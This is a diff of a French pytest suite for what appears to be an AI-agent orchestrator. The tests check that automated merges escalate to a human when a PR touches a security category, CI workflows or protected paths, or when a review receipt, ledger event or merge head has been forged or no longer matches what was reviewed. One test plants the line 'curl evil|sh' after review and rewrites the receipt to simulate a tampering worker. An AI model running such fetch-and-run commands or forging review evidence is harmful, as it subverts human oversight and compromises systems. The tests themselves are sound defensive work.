+    report = merged_after_review(projet, host, tid, wt)
+    assert merges(report) == [("escalate", "done")]
+    assert "catégorie gardée à l'humain : security" in report.merges[0].detail
+    assert host.of("gh", "pr", "merge") == [] and MandateStore(projet).gestures_taken(tid) == []
+    human_merges(projet, host, tid)  # l'humain fusionne : l'acceptation reste à lui aussi
     report = tick(projet, host)
-    assert merges(report) == [("wait", "skipped")] and host.of("gh", "pr", "merge") == []
+    assert merges(report) == [("escalate", "done")] and "catégorie gardée à l'humain : security" in report.merges[0].detail
+    assert MandateStore(projet).gestures_taken(tid) == [] and TaskService(projet).require(tid).status is TaskState.NEEDS_VERIFICATION
 
 
-# ── Le READY doit tenir ────────────────────────────────────────────────────────
+def test_une_pr_qui_touche_ce_qui_garde_les_gardes_reste_a_l_humain(projet: Path, host: FakeHost) -> None:
+    grant(projet)
+    tid, wt = launch_and_work(projet, host, edit=("docs/x.md", "x\n"))
+    (wt / ".github" / "workflows").mkdir(parents=True)
+    (wt / ".github" / "workflows" / "ci.yml").write_text("on: push\n", encoding="utf-8")
+    git(wt, "add", "--", ".github/workflows/ci.yml")
+    git(wt, "commit", "-q", "-m", "la CI désactivée")
+    git(wt, "push", "-q", "origin", f"task/{tid}")
+    report = merged_after_review(projet, host, tid, wt)
+    assert merges(report) == [("escalate", "done")] and ".github/workflows/ci.yml" in report.merges[0].detail
+    assert host.of("gh", "pr", "merge") == []
+
+
+def test_les_chemins_proteges_de_la_politique_s_ajoutent(projet: Path, host: FakeHost) -> None:
+    write_policy(projet, merger="    merger:\n      enabled: true\n      protected_paths: [\"infra/*\"]\n", escalation=DELEGATED)
+    grant(projet)
+    tid, wt = launch_and_work(projet, host, edit=("infra/main.tf", "x\n"))
+    report = merged_after_review(projet, host, tid, wt)
+    assert merges(report) == [("escalate", "done")] and "infra/main.tf" in report.merges[0].detail
+
+
+def test_une_relecture_non_attestee_ne_fonde_pas_une_fusion_sous_mandat(projet: Path, host: FakeHost) -> None:
+    tid, wt = launch_and_work(projet, host)
+    tick(projet, host)  # relecteur lancé sans mandat : sa session n'est pas inscrite
+    grant(projet)
+    give_ready(host, tid, wt)
+    tick(projet, host)
+    report = tick(projet, host)
+    assert merges(report) == [("escalate", "done")] and "journal d'autorité" in report.merges[0].detail
+    assert host.of("gh", "pr", "merge") == []
+
+
+def test_mandat_qui_couvre_merge_mais_pas_accept(projet: Path, host: FakeHost) -> None:
+    mandate = grant(projet, ("merge",))
+    tid, wt = launch_and_work(projet, host)
+    report = merged_after_review(projet, host, tid, wt)
+    assert merges(report) == [("escalate", "done")] and "accept refusé" in report.merges[0].detail
+    assert [(g["gesture"], g["mandate_id"]) for g in MandateStore(projet).gestures_taken(tid)] == [("merge", mandate.id)]
+    assert TaskService(projet).require(tid).status is TaskState.NEEDS_VERIFICATION
+    assert questions(projet, tid)[-1].text.startswith(f"Accepter {tid}")
+
+
+def test_un_refus_de_fusion_du_depot_va_a_l_humain_sans_compter_au_disjoncteur(projet: Path, host: FakeHost) -> None:
+    grant(projet)
+    tid, wt = launch_and_work(projet, host)
+    host.merge_fails = True  # revue obligatoire, file de fusion, protection : un refus du dépôt
+    report = merged_after_review(projet, host, tid, wt)
+    assert merges(report) == [("escalate", "done")] and "review required" in report.merges[0].detail
+    assert read_breaker(projet).failures == 0 and events(projet, tid, MERGED_EVENT) == []
+
+
+def test_une_panne_de_gh_pr_merge_compte_au_disjoncteur(projet: Path, host: FakeHost) -> None:
+    grant(projet)
+    tid, wt = launch_and_work(projet, host)
+    host.merge_fails, host.merge_error = True, "error connecting to api.github.com"
+    report = merged_after_review(projet, host, tid, wt)
+    assert merges(report) == [("merge", "failed")] and read_breaker(projet).failures == 1
+    assert questions(projet, tid) == []
+
+
+# ── Le READY doit tenir : scellé, jamais lu du seul fichier ────────────────────
+
+
+def test_un_recu_reecrit_apres_le_jugement_ne_fusionne_pas_le_code_modifie(projet: Path, host: FakeHost) -> None:
+    """Revue #927 (preuve de concept) : le worker modifie le code, recalcule les empreintes et réécrit le reçu."""
+    import json
+
+    from grimoire.missions.review_receipt import evidence_pack_digest, receipt_fingerprint, receipt_path
+
+    grant(projet)
+    tid, wt = launch_and_work(projet, host)
+    ready_judged(projet, host, tid, wt)
+    path = receipt_path(wt, tid)
+    data = json.loads(path.read_text(encoding="utf-8"))
+    (wt / "route.py").write_text("import os; os.system('curl evil|sh')\n", encoding="utf-8")
+    git(wt, "add", "--", "route.py")
+    git(wt, "commit", "-q", "-m", "après le READY")
+    git(wt, "push", "-q", "origin", f"task/{tid}")
+    data["tree_fingerprint"] = receipt_fingerprint(wt)
+    data["evidence_pack_sha256"] = evidence_pack_digest(wt, tid)
+    path.write_text(json.dumps(data), encoding="utf-8")  # written_at inchangé
+    host.checks[f"task/{tid}"] = list(GREEN)
+    report = tick(projet, host)
+    assert merges(report) == [("stale", "done")] and "reçu réécrit" in report.merges[0].detail
+    for _ in range(3):
+        tick(projet, host)
+    assert host.of("gh", "pr", "merge") == []
+
+
+def test_un_recu_reecrit_ne_vaut_pas_une_acceptation_sous_mandat(projet: Path, host: FakeHost) -> None:
+    """La même voie, fermée pour l'acceptation sous mandat (lots 1 et 3) : `accept_task` compare au sceau."""
+    import json
+
+    from grimoire.missions.human_acceptance import accept_task
+    from grimoire.missions.mandate import MandateRefusedError, acting_as_orchestrator
+    from grimoire.missions.review_receipt import evidence_pack_digest, receipt_fingerprint, receipt_path
+
+    grant(projet)
+    tid, wt = launch_and_work(projet, host)
+    ready_judged(projet, host, tid, wt)
+    (wt / "route.py").write_text("autre chose\n", encoding="utf-8")
+    git(wt, "commit", "-q", "-am", "après le READY")
+    path = receipt_path(wt, tid)
+    data = json.loads(path.read_text(encoding="utf-8"))
+    data["tree_fingerprint"], data["evidence_pack_sha256"] = receipt_fingerprint(wt), evidence_pack_digest(wt, tid)
+    path.write_text(json.dumps(data), encoding="utf-8")
+    task = TaskService(projet).require(tid)
+    with acting_as_orchestrator(), pytest.raises(MandateRefusedError, match="reçu réécrit"):
+        accept_task(task, projet, wt / EVIDENCE, "relu", "merger", origin="orchestrator",
+                    provenance={"kind": "verdict", "ref": "x"}, proof_root=wt)
 
 
 def test_un_ready_perime_rend_la_tache_a_la_relecture(projet: Path, host: FakeHost) -> None:
     grant(projet)
     tid, wt = launch_and_work(projet, host)
-    host.checks[f"task/{tid}"] = [{"name": "tests", "bucket": "pending"}]
-    assert merges(review_ready(projet, host, tid, wt)) == [("wait", "waiting")]  # READY jugé, la CI tourne
+    ready_judged(projet, host, tid, wt)
     (wt / "route.py").write_text("autre chose\n", encoding="utf-8")  # commité et poussé après le jugement READY
     git(wt, "commit", "-q", "-am", "après la relecture")
     git(wt, "push", "-q", "origin", f"task/{tid}")
@@ -564,14 +669,203 @@ def test_un_ready_perime_rend_la_tache_a_la_relecture(projet: Path, host: FakeHo
 def test_un_arbre_modifie_non_commite_renvoie_au_worker(projet: Path, host: FakeHost) -> None:
     grant(projet)
     tid, wt = launch_and_work(projet, host)
-    tick(projet, host)
-    item = EvidenceItem.from_text("check-01", EvidenceKind.TEST, "ok", uri="check:pytest", summary="ok")
-    EvidenceService(wt / EVIDENCE).create_pack(tid, EvidenceProfile.LIGHT, [item], acceptance=CRITERIA)
+    ready_judged(projet, host, tid, wt)
     (wt / "brouillon.txt").write_text("pas commité\n", encoding="utf-8")
-    write_receipt(wt, tid, "READY", reviewer_id="reviewer", reviewer_session=reviewer_sid(host))
     report = tick(projet, host)
     assert merges(report) == [("bounce", "done")] and "brouillon.txt" in report.merges[0].detail
     assert host.of("gh", "pr", "merge") == []
+
+
+def test_un_worktree_qui_n_est_pas_celui_de_la_tache_est_refuse(projet: Path, host: FakeHost) -> None:
+    from grimoire.missions.task_worktree import WORKTREE_CREATED_EVENT
+
+    grant(projet)
+    tid, wt = launch_and_work(projet, host)
+    ready_judged(projet, host, tid, wt)
+    wt_event = events(projet, tid, WORKTREE_CREATED_EVENT)[-1]
+    TaskService(projet).ledger.append_event(WORKTREE_CREATED_EVENT, tid, "task", "agent", {**wt_event.payload, "branch": "main"})
+    report = tick(projet, host)
+    assert merges(report) == [("refused", "refused")] and "task/" in report.merges[0].detail
+    TaskService(projet).ledger.append_event(WORKTREE_CREATED_EVENT, tid, "task", "agent", {**wt_event.payload, "path": str(projet.parent)})
+    assert merges(tick(projet, host)) == [("refused", "refused")]
+    # Un autre dépôt, extrait sur une branche du même nom : pas un worktree de ce dépôt.
+    advance_main(projet, "z.py", "z\n")
+    other = projet.parent / "autre-clone"
+    git(other, "checkout", "-q", "-b", f"task/{tid}")
+    TaskService(projet).ledger.append_event(WORKTREE_CREATED_EVENT, tid, "task", "agent", {**wt_event.payload, "path": str(other)})
+    report = tick(projet, host)
+    assert merges(report) == [("refused", "refused")] and "pas un worktree de ce dépôt" in report.merges[0].detail
+    assert host.of("gh", "pr", "merge") == []
+
+
+def test_un_ready_sans_sceau_ne_fonde_aucune_fusion(projet: Path, host: FakeHost, monkeypatch: pytest.MonkeyPatch) -> None:
+    from grimoire.missions import review_seal
+    from grimoire.missions.reviewer import REVIEW_JUDGED_EVENT
+
+    def broken(*_args: object, **_kwargs: object) -> dict[str, object]:
+        raise OSError("journal d'autorité en panne")
+
+    monkeypatch.setattr(review_seal, "seal_judgment", broken)
+    grant(projet)
+    tid, wt = launch_and_work(projet, host)
+    report = review_ready(projet, host, tid, wt)
+    assert events(projet, tid, REVIEW_JUDGED_EVENT)[-1].payload["sealed"] is False
+    assert merges(report) == [("stale", "done")] and "aucun jugement READY scellé" in report.merges[0].detail
+    assert host.of("gh", "pr", "merge") == [] and events(projet, tid, MERGED_EVENT) == []
+
+
+def test_un_ready_dont_l_arbre_n_est_pas_celui_du_recu_n_est_pas_scelle(projet: Path, host: FakeHost, monkeypatch: pytest.MonkeyPatch) -> None:
+    """Une tâche dont le reçu n'est pas exigé au gate (V0) : le sceau, lui, exige l'arbre que le reçu déclare."""
+    from grimoire.missions import reviewer
+
+    monkeypatch.setattr(reviewer, "check_receipt", lambda *_a, **_k: None)
+    tid, wt = launch_and_work(projet, host)
+    tick(projet, host)
+    give_ready(host, tid, wt)
+    (wt / "route.py").write_text("modifié après le reçu\n", encoding="utf-8")
+    report = tick(projet, host)
+    assert [(o.action, o.status) for o in report.reviews] == [("stale", "done")]
+    assert "arbre présent" in report.reviews[0].detail and report.merges == ()
+
+
+# ── Constat sur la remote, rejeu, échecs ───────────────────────────────────────
+
+
+def test_une_fusion_non_constatee_n_est_ni_notee_ni_acceptee(projet: Path, host: FakeHost) -> None:
+    grant(projet)
+    tid, wt = launch_and_work(projet, host)
+    host.merge_lands = False  # gh sort en 0, la PR reste ouverte
+    git(projet, "fetch", "-q", "origin", "main")
+    host.merge_commits[f"task/{tid}"] = git(projet, "rev-parse", "refs/remotes/origin/main")  # un oid sans état MERGED
+    report = merged_after_review(projet, host, tid, wt)
+    assert merges(report) == [("unconfirmed", "waiting")]
+    assert events(projet, tid, MERGED_EVENT) == [] and MandateStore(projet).gestures_taken(tid) == []
+    assert TaskService(projet).require(tid).status is TaskState.NEEDS_VERIFICATION
+    host.merge_lands = True
+    host.merge_commits.pop(f"task/{tid}")
+    assert merges(tick(projet, host)) == [("accept", "done")]
+    assert [g["gesture"] for g in MandateStore(projet).gestures_taken(tid)] == ["merge", "accept"]
+
+
+def test_un_commit_de_fusion_absent_de_la_cible_n_est_pas_une_fusion(projet: Path, host: FakeHost) -> None:
+    grant(projet)
+    tid, wt = launch_and_work(projet, host)
+    ready_judged(projet, host, tid, wt)
+    branch = f"task/{tid}"
+    host.prs[branch], host.merge_commits[branch] = "MERGED", git(wt, "rev-parse", "HEAD")  # jamais arrivé sur main
+    report = tick(projet, host)
+    assert merges(report) == [("unconfirmed", "waiting")] and events(projet, tid, MERGED_EVENT) == []
+    assert TaskService(projet).require(tid).status is TaskState.NEEDS_VERIFICATION
+
+
+def test_une_fusion_forgee_au_ledger_n_est_pas_acceptee(projet: Path, host: FakeHost) -> None:
+    grant(projet)
+    tid, wt = launch_and_work(projet, host)
+    ready_judged(projet, host, tid, wt)
+    TaskService(projet).ledger.append_event(MERGED_EVENT, tid, "task", "agent", {"pr": 7, "head_sha": git(wt, "rev-parse", "HEAD")})
+    report = tick(projet, host)
+    assert merges(report) == [("accept", "refused")] and "fusion non constatée" in report.merges[0].detail
+    assert TaskService(projet).require(tid).status is TaskState.NEEDS_VERIFICATION
+    assert MandateStore(projet).gestures_taken(tid) == []
+
+
+def test_une_fusion_faite_et_non_notee_est_constatee_au_tick_suivant_jamais_refaite(projet: Path, host: FakeHost) -> None:
+    grant(projet)
+    tid, wt = launch_and_work(projet, host)
+    host.broken_after_merge = True
+    report = merged_after_review(projet, host, tid, wt)
+    assert merges(report) == [("unconfirmed", "failed")] and read_breaker(projet).failures == 1
+    assert events(projet, tid, MERGED_EVENT) == []
+    host.gh_broken = False
+    assert merges(tick(projet, host)) == [("accept", "done")]
+    assert len(host.of("gh", "pr", "merge")) == 1 and len(events(projet, tid, MERGED_EVENT)) == 1
+    assert [g["gesture"] for g in MandateStore(projet).gestures_taken(tid)] == ["merge", "accept"]  # inscrite une fois
+
+
+def _cut_once(monkeypatch: pytest.MonkeyPatch, kind: str) -> None:
+    from grimoire.missions.ledger import MissionLedger
+
+    real = MissionLedger.append_event
+    cut = {"once": True}
+
+    def flaky(self: MissionLedger, event: str, *args: object, **kwargs: object) -> object:
+        if event == kind and cut["once"]:
+            cut["once"] = False
+            raise OSError("coupure simulée")
+        return real(self, event, *args, **kwargs)  # type: ignore[arg-type]
+
+    monkeypatch.setattr(MissionLedger, "append_event", flaky)
+
+
+def test_une_coupure_entre_le_journal_d_autorite_et_le_ledger_n_inscrit_pas_deux_fois(
+    projet: Path, host: FakeHost, monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    grant(projet)
+    tid, wt = launch_and_work(projet, host)
+    review_ready(projet, host, tid, wt)
+    _cut_once(monkeypatch, MERGED_EVENT)
+    assert merges(tick(projet, host)) == [("error", "failed")]
+    assert [g["gesture"] for g in MandateStore(projet).gestures_taken(tid)] == ["merge"]
+    assert merges(tick(projet, host)) == [("accept", "done")]
+    assert [g["gesture"] for g in MandateStore(projet).gestures_taken(tid)] == ["merge", "accept"]
+    assert len(host.of("gh", "pr", "merge")) == 1
+
+
+def test_une_coupure_apres_l_acceptation_ne_refait_ni_geste_ni_pack(
+    projet: Path, host: FakeHost, monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    from grimoire.missions.merger import MERGE_ACCEPTED_EVENT
+
+    grant(projet)
+    tid, wt = launch_and_work(projet, host)
+    review_ready(projet, host, tid, wt)
+    _cut_once(monkeypatch, MERGE_ACCEPTED_EVENT)
+    assert merges(tick(projet, host)) == [("error", "failed")]
+    packs = len(EvidenceService(wt / EVIDENCE).list_packs(tid))
+    assert merges(tick(projet, host)) == [("accept", "done")]
+    assert [g["gesture"] for g in MandateStore(projet).gestures_taken(tid)] == ["merge", "accept"]
+    assert len(EvidenceService(wt / EVIDENCE).list_packs(tid)) == packs
+    assert TaskService(projet).require(tid).status is TaskState.CLOSED
+
+
+def test_un_gh_en_panne_est_rapporte_compte_et_rejoue(projet: Path, host: FakeHost) -> None:
+    grant(projet)
+    tid, wt = launch_and_work(projet, host)
+    tick(projet, host)
+    give_ready(host, tid, wt)
+    host.gh_broken = True
+    report = tick(projet, host)
+    assert merges(report) == [("wait", "failed")] and any(a.startswith("merger :") for a in report.attention)
+    assert read_breaker(projet).failures == 1
+    host.gh_broken = False
+    tick(projet, host)
+    assert merges(tick(projet, host)) == [("accept", "done")]
+
+
+def test_disjoncteur_ouvert_rien_n_est_fusionne(projet: Path, host: FakeHost) -> None:
+    grant(projet)
+    tid, wt = launch_and_work(projet, host)
+    tick(projet, host)
+    trip(projet, "autre tâche")
+    give_ready(host, tid, wt)
+    report = tick(projet, host)
+    assert merges(report) == [("wait", "skipped")] and host.of("gh", "pr", "merge") == []
+
+
+def test_une_tete_fusionnee_autre_que_la_relue_n_est_pas_acceptee_sous_mandat(projet: Path, host: FakeHost) -> None:
+    grant(projet)
+    tid, wt = launch_and_work(projet, host)
+    ready_judged(projet, host, tid, wt)
+    # Quelqu'un fusionne la PR sur GitHub à une autre tête que celle que la relecture couvre.
+    advance_main(projet, "ailleurs.py", "x\n")
+    other = git(projet.parent / "autre-clone", "rev-parse", "HEAD")
+    branch = f"task/{tid}"
+    host.prs[branch], host.pr_heads[branch], host.merge_commits[branch] = "MERGED", other, other
+    report = tick(projet, host)
+    assert merges(report) == [("escalate", "done")] and "n'est pas celle du worktree relu" in report.merges[0].detail
+    [merged] = events(projet, tid, MERGED_EVENT)
+    assert merged.payload["origin"] == "remote"
+    assert host.of("gh", "pr", "merge") == [] and MandateStore(projet).gestures_taken(tid) == []
 
 
 # ── Interrupteur, politique, robustesse ────────────────────────────────────────
@@ -581,7 +875,8 @@ def test_merger_desactive_par_defaut_rien_ne_change(projet: Path, host: FakeHost
     write_policy(projet, merger="", escalation=DELEGATED)
     grant(projet)
     tid, wt = launch_and_work(projet, host)
-    report = review_ready(projet, host, tid, wt)
+    review_ready(projet, host, tid, wt)
+    report = tick(projet, host)
     assert report.merges == () and "merges" not in report.to_dict() and host.of("gh", "pr", "merge") == []
     assert TaskService(projet).require(tid).status is TaskState.NEEDS_VERIFICATION
 
@@ -607,9 +902,11 @@ def test_la_politique_du_merger_est_lue_et_validee(projet: Path) -> None:
     assert "clé inconnue wip" in load_orchestrator_policy(projet).error
     write_policy(projet, merger="    merger:\n      ignored_checks: codecov\n")
     assert "ignored_checks" in load_orchestrator_policy(projet).error
+    write_policy(projet, merger="    merger:\n      protected_paths: [\"\"]\n")
+    assert "protected_paths" in load_orchestrator_policy(projet).error
     write_policy(projet, merger="")
     role = load_orchestrator_policy(projet).policy.merger  # type: ignore[union-attr]
-    assert not role.enabled and role.ignored_checks == ("codecov/*",)
+    assert not role.enabled and role.ignored_checks == ("codecov/*",) and role.protected_paths == ()
 
 
 def test_un_echec_de_reprise_du_worker_remet_la_tache_en_revue(projet: Path, host: FakeHost) -> None:
@@ -630,8 +927,7 @@ def test_ci_rouge_a_repetition_escalade_a_l_humain(projet: Path, host: FakeHost)
     tid, wt = launch_and_work(projet, host)
     host.checks[f"task/{tid}"] = [{"name": "tests", "bucket": "fail"}]
     assert merges(review_ready(projet, host, tid, wt)) == [("bounce", "done")]
-    ledger = TaskService(projet).ledger
-    ledger.transition_task(tid, TaskState.NEEDS_VERIFICATION, actor_id="worker")  # le worker remet en revue
+    TaskService(projet).ledger.transition_task(tid, TaskState.NEEDS_VERIFICATION, actor_id="worker")  # remise en revue
     report = review_ready(projet, host, tid, wt)
     assert merges(report) == [("escalate", "done")]
     task = TaskService(projet).require(tid)
@@ -639,35 +935,3 @@ def test_ci_rouge_a_repetition_escalade_a_l_humain(projet: Path, host: FakeHost)
     assert len(host.of("claude", "--bg", "--resume")) == 1
     assert [e.payload.get("escalated", False) for e in events(projet, tid, MERGE_BOUNCED_EVENT)] == [False, True]
     assert len(events(projet, tid, MERGE_ESCALATED_EVENT)) == 1
-
-
-def test_une_tete_fusionnee_autre_que_la_relue_n_est_pas_acceptee_sous_mandat(projet: Path, host: FakeHost) -> None:
-    grant(projet)
-    tid, wt = launch_and_work(projet, host)
-    host.checks[f"task/{tid}"] = [{"name": "tests", "bucket": "pending"}]
-    assert merges(review_ready(projet, host, tid, wt)) == [("wait", "waiting")]
-    # Quelqu'un fusionne la PR sur GitHub à une autre tête que celle que la relecture couvre.
-    advance_main(projet, "ailleurs.py", "x\n")
-    other = git(projet.parent / "autre-clone", "rev-parse", "HEAD")
-    branch = f"task/{tid}"
-    host.prs[branch], host.pr_heads[branch], host.merge_commits[branch] = "MERGED", other, other
-    report = tick(projet, host)
-    assert merges(report) == [("escalate", "done")] and "n'est pas celle que la relecture READY couvre" in report.merges[0].detail
-    [merged] = events(projet, tid, MERGED_EVENT)
-    assert merged.payload["reviewed"] is False and merged.payload["origin"] == "remote"
-    assert host.of("gh", "pr", "merge") == [] and MandateStore(projet).gestures_taken(tid) == []
-
-
-def test_une_reponse_qui_ne_vient_pas_du_canal_humain_ne_vaut_pas_le_geste(projet: Path, host: FakeHost) -> None:
-    from grimoire.missions.waiting import HUMAN_ANSWERED_EVENT
-
-    tid, wt = launch_and_work(projet, host)
-    review_ready(projet, host, tid, wt)
-    question = TaskService(projet).require(tid).waiting.question  # type: ignore[union-attr]
-    ledger = TaskService(projet).ledger
-    ledger.append_event(HUMAN_ANSWERED_EVENT, tid, "task", "agent",
-                        {"task_id": tid, "question_id": question.id, "answer": "fusionner", "origin": "agent"})  # type: ignore[union-attr]
-    ledger.wake(tid, reason="réponse", cause="answer")
-    report = tick(projet, host)
-    assert report.merges == () and host.of("gh", "pr", "merge") == []
-    assert [o.status for o in report.launches] == ["launched"]  # rendue au worker, pas reprise par le merger
